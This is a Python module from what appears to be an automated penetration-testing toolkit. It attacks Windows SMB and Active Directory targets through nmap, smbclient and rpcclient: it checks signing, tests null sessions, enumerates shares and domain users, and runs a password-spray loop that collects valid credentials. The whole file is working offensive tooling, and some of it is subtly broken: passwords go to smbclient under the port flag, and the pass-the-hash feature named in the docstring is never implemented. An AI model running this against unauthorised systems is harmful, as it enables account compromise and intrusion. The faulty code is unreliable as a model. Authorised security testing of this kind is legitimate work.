"""
SMB Attack Module

Implements SMB-based enumeration and attacks:
- Share enumeration
- User enumeration via SMB
- Password spraying
- Pass-the-hash authentication
- SMB signing checks

Uses Impacket and CrackMapExec for SMB operations.

Usage:
    from aipt_v2.tools.active_directory import SMBAttacks

    smb = SMBAttacks(config)
    shares = await smb.enumerate_shares()
"""

import asyncio
import re
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import List, Dict, Any, Optional

from aipt_v2.core.event_loop_manager import current_time
from aipt_v2.tools.active_directory.ad_config import ADConfig, get_ad_config


@dataclass
class SMBFinding:
    """SMB security finding."""
    category: str  # share, signing, auth, misc
    severity: str
    title: str
    description: str
    target: str
    evidence: str = ""
    remediation: str = ""
    timestamp: str = ""

    def __post_init__(self):
        if not self.timestamp:
            self.timestamp = datetime.now(timezone.utc).isoformat()


@dataclass
class SMBShare:
    """SMB share information."""
    name: str
    share_type: str
    remark: str
    readable: bool
    writable: bool
    permissions: List[str] = field(default_factory=list)


@dataclass
class SMBResult:
    """Result of SMB enumeration."""
    target: str
    status: str
    started_at: str
    finished_at: str
    duration: float
    shares: List[SMBShare]
    os_info: Dict[str, str]
    signing_required: bool
    findings: List[SMBFinding]
    metadata: Dict[str, Any] = field(default_factory=dict)


class SMBAttacks:
    """
    SMB Attack and Enumeration Tool.

    Performs SMB-based reconnaissance and attacks
    against Windows systems.
    """

    # Sensitive share names
    SENSITIVE_SHARES = [
        "ADMIN$", "C$", "IPC$", "SYSVOL", "NETLOGON",
        "backup", "Backup", "IT", "Admin", "HR", "Finance",
        "Confidential", "Private", "Secure"
    ]

    def __init__(self, config: Optional[ADConfig] = None):
        """
        Initialize SMB attacker.

        Args:
            config: AD configuration
        """
        self.config = config or ADConfig()
        self.findings: List[SMBFinding] = []
        self.shares: List[SMBShare] = []
        self.os_info: Dict[str, str] = {}
        self.signing_required: bool = True

    async def _run_command(self, cmd: List[str]) -> str:
        """Run command and return output."""
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=self.config.timeout
            )

            return stdout.decode() + stderr.decode()

        except asyncio.TimeoutError:
            return ""
        except FileNotFoundError:
            return f"[!] Command not found: {cmd[0]}"
        except Exception as e:
            return f"[!] Error: {e}"

    async def check_smb_signing(self, target: str = None) -> bool:
        """
        Check if SMB signing is required.

        Args:
            target: Target IP (uses config.dc_ip if not provided)

        Returns:
            True if signing is required
        """
        target = target or self.config.dc_ip

        # Use nmap for signing check
        output = await self._run_command([
            "nmap", "-p", "445",
            "--script", "smb2-security-mode",
            target
        ])

        if "Message signing enabled but not required" in output:
            self.signing_required = False
            self.findings.append(SMBFinding(
                category="signing",
                severity="high",
                title="SMB Signing Not Required",
                description="SMB signing is enabled but not required",
                target=target,
                evidence="Message signing enabled but not required",
                remediation="Enable mandatory SMB signing via GPO"
            ))
        elif "Message signing enabled and required" in output:
            self.signing_required = True
        elif "not required" in output.lower():
            self.signing_required = False
            self.findings.append(SMBFinding(
                category="signing",
                severity="high",
                title="SMB Signing Not Required",
                description="SMB signing is not enforced",
                target=target,
                evidence=output[:200],
                remediation="Enable mandatory SMB signing"
            ))

        return self.signing_required

    async def enumerate_shares(self, target: str = None) -> List[SMBShare]:
        """
        Enumerate SMB shares.

        Args:
            target: Target IP

        Returns:
            List of discovered shares
        """
        target = target or self.config.dc_ip
        shares = []

        # Build smbclient command
        cmd = ["smbclient", "-L", target, "-N"]  # Null session first

        if self.config.credentials.has_credentials():
            user = self.config.credentials.get_auth_string()
            cmd = ["smbclient", "-L", target, "-U", user]
            if self.config.credentials.password:
                cmd.extend(["-p", self.config.credentials.password])

        output = await self._run_command(cmd)

        # Parse share listing
        share_pattern = r"^\s+(\S+)\s+(Disk|IPC|Printer)\s*(.*?)$"
        for line in output.split("\n"):
            match = re.match(share_pattern, line)
            if match:
                share_name = match.group(1)
                share_type = match.group(2)
                remark = match.group(3).strip()

                share = SMBShare(
                    name=share_name,
                    share_type=share_type,
                    remark=remark,
                    readable=False,
                    writable=False
                )
                shares.append(share)

                # Check for sensitive shares
                if any(sens.lower() in share_name.lower() for sens in self.SENSITIVE_SHARES):
                    self.findings.append(SMBFinding(
                        category="share",
                        severity="medium",
                        title=f"Sensitive Share: {share_name}",
                        description=f"Potentially sensitive share discovered: {share_name}",
                        target=target,
                        evidence=f"Share: {share_name} ({share_type})",
                        remediation="Review share permissions and access"
                    ))

        # Try to access each share
        for share in shares:
            access = await self._check_share_access(target, share.name)
            share.readable = access.get("readable", False)
            share.writable = access.get("writable", False)

            if share.readable and share.name not in ["IPC$"]:
                self.findings.append(SMBFinding(
                    category="share",
                    severity="low" if share.name in ["SYSVOL", "NETLOGON"] else "medium",
                    title=f"Readable Share: {share.name}",
                    description=f"Share {share.name} is readable",
                    target=target,
                    evidence="Share access confirmed",
                    remediation="Review if read access is necessary"
                ))

            if share.writable:
                self.findings.append(SMBFinding(
                    category="share",
                    severity="high",
                    title=f"Writable Share: {share.name}",
                    description=f"Share {share.name} is writable",
                    target=target,
                    evidence="Write access confirmed",
                    remediation="Restrict write access to authorized users only"
                ))

        self.shares = shares
        return shares

    async def _check_share_access(self, target: str, share: str) -> Dict[str, bool]:
        """Check read/write access to a share."""
        access = {"readable": False, "writable": False}

        # Build connection command
        if self.config.credentials.has_credentials():
            user = self.config.credentials.get_auth_string()
            cmd = [
                "smbclient",
                f"//{target}/{share}",
                "-U", user,
                "-c", "dir"
            ]
            if self.config.credentials.password:
                cmd.insert(4, "-p")
                cmd.insert(5, self.config.credentials.password)
        else:
            cmd = ["smbclient", f"//{target}/{share}", "-N", "-c", "dir"]

        output = await self._run_command(cmd)

        # Check if we could list contents
        if "NT_STATUS_ACCESS_DENIED" not in output and "Error" not in output:
            if any(x in output for x in ["blocks", "bytes", "Directory"]):
                access["readable"] = True

        # TODO: Add write check with careful file creation/deletion

        return access

    async def get_os_info(self, target: str = None) -> Dict[str, str]:
        """
        Get OS information via SMB.

        Args:
            target: Target IP

        Returns:
            OS information dict
        """
        target = target or self.config.dc_ip
        os_info = {}

        # Use nmap for OS detection
        output = await self._run_command([
            "nmap", "-p", "445",
            "--script", "smb-os-discovery",
            target
        ])

        # Parse OS info
        os_match = re.search(r"OS:\s*(.+?)$", output, re.MULTILINE)
        if os_match:
            os_info["os"] = os_match.group(1).strip()

        computer_match = re.search(r"Computer name:\s*(.+?)$", output, re.MULTILINE)
        if computer_match:
            os_info["computer_name"] = computer_match.group(1).strip()

        domain_match = re.search(r"Domain name:\s*(.+?)$", output, re.MULTILINE)
        if domain_match:
            os_info["domain"] = domain_match.group(1).strip()

        self.os_info = os_info
        return os_info

    async def enumerate_users_rpc(self, target: str = None) -> List[str]:
        """
        Enumerate users via RPC.

        Args:
            target: Target IP

        Returns:
            List of usernames
        """
        target = target or self.config.dc_ip
        users = []

        # Use rpcclient for enumeration
        cmd = ["rpcclient", "-U", "", target, "-N", "-c", "enumdomusers"]

        if self.config.credentials.has_credentials():
            user = self.config.credentials.get_auth_string()
            password = self.config.credentials.get_password_or_hash()
            cmd = [
                "rpcclient", "-U", f"{user}%{password}",
                target, "-c", "enumdomusers"
            ]

        output = await self._run_command(cmd)

        # Parse users
        user_pattern = r"user:\[([^\]]+)\]"
        matches = re.findall(user_pattern, output)
        users.extend(matches)

        return users

    async def password_spray(
        self,
        users: List[str],
        password: str,
        target: str = None
    ) -> List[Dict]:
        """
        Perform password spray attack.

        Args:
            users: List of usernames
            password: Password to try
            target: Target IP

        Returns:
            List of valid credentials
        """
        target = target or self.config.dc_ip
        valid_creds = []

        for user in users:
            # Use crackmapexec or smbclient for auth test
            cmd = [
                "smbclient",
                f"//{target}/IPC$",
                "-U", f"{self.config.domain}\\{user}%{password}",
                "-c", "exit"
            ]

            output = await self._run_command(cmd)

            if "NT_STATUS_LOGON_FAILURE" not in output and "Error" not in output:
                valid_creds.append({
                    "username": user,
                    "password": password
                })

                self.findings.append(SMBFinding(
                    category="auth",
                    severity="critical",
                    title=f"Valid Credentials: {user}",
                    description=f"Password spray found valid credentials for {user}",
                    target=target,
                    evidence=f"User: {user}, Password: {password[:3]}***",
                    remediation="Enforce strong password policies"
                ))

            # Add delay to avoid lockout
            await asyncio.sleep(0.5)

        return valid_creds

    async def test_null_session(self, target: str = None) -> bool:
        """
        Test for null session access.

        Args:
            target: Target IP

        Returns:
            True if null session works
        """
        target = target or self.config.dc_ip

        cmd = ["smbclient", f"//{target}/IPC$", "-N", "-c", "exit"]
        output = await self._run_command(cmd)

        null_session = "NT_STATUS_ACCESS_DENIED" not in output

        if null_session:
            self.findings.append(SMBFinding(
                category="auth",
                severity="high",
                title="Null Session Allowed",
                description="Anonymous/null session authentication is allowed",
                target=target,
                evidence="IPC$ accessible without credentials",
                remediation="Disable null session access via registry or GPO"
            ))

        return null_session

    async def enumerate(self, target: str = None) -> SMBResult:
        """
        Run full SMB enumeration.

        Args:
            target: Target IP

        Returns:
            SMBResult with findings
        """
        target = target or self.config.dc_ip

        started_at = datetime.now(timezone.utc).isoformat()
        start_time = current_time()

        # Run enumeration
        await self.check_smb_signing(target)
        await self.test_null_session(target)
        await self.get_os_info(target)
        await self.enumerate_shares(target)

        finished_at = datetime.now(timezone.utc).isoformat()
        duration = current_time() - start_time

        return SMBResult(
            target=target,
            status="completed",
            started_at=started_at,
            finished_at=finished_at,
            duration=duration,
            shares=self.shares,
            os_info=self.os_info,
            signing_required=self.signing_required,
            findings=self.findings,
            metadata={
                "share_count": len(self.shares),
                "finding_count": len(self.findings)
            }
        )


# Convenience function
async def enumerate_smb(
    target: str,
    domain: str = None,
    username: str = None,
    password: str = None,
    **kwargs
) -> SMBResult:
    """
    Quick SMB enumeration.

    Args:
        target: Target IP or hostname
        domain: AD domain
        username: Username
        password: Password

    Returns:
        SMBResult
    """
    config = get_ad_config(
        domain=domain or "",
        dc_ip=target,
        username=username or "",
        password=password or "",
        **kwargs
    )

    smb = SMBAttacks(config)
    return await smb.enumerate(target)
